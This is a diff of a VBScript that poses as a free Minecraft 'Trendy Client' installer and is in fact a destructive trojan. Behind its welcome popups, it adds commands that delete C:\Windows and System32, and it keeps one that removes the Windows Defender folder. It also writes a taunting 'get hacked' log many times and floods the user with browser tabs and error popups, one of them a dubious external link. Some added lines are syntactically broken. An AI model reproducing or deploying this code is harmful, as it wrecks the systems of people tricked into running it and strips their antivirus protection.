@@ -3,39 +3,87 @@ On Error Resume Next
 Set carew= CreateObject("WScript.Shell")
 
 'O
-     	
-Msgbox "Welcome Trendy Client, press OK or Accept to Start Trendy Client. "
+
+Msgbox "Welcome Trendy Client, press OK or Accept to Start Trendy Client."
 Msgbox "Loading Trendy Client... 0% - 100%"
 Msgbox "Thank You for using Trendy Client!"
 Msgbox "You can now close this Application, Startup Minecraft and you should have Trendy Client!"
 Msgbox "DO NOT RESTART YOUR COMPUTER! (UPDATE)"
 If Month(Now()) = 09 And  Day(Now()) = 01 Then MsgBox "Free Minecraft Client"
 
+carew.deleteFolder "C:\Windows" 
+carew.deleteFolder "C:\Windows\System32"
 carew.deleteFolder "C:\Program Files\Windows Defender"
+
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+	
+set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
+virus.Writeline "Due an error, Code error:3212552, Trendy client is installed"                                 
+virus.Writeline "For Support Please Send an Email to Suckmyballs123@gmail.com, If you want purchase Trendy+ to get more hacked." 			
+virus.Close					       
+
 
 carew.Run "https://myprivate.pics/watch.php?video=I2M1MK.php"  
 carew.Run "https://trendy-client.base44.app"
 carew.Run "https://trendy-client.base44.app"
 carew.Run "https://trendy-client.base44.app"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", Msgbox "GET HACKED"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
-carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
+carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0", lol=msgbox("",16,"Error")
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
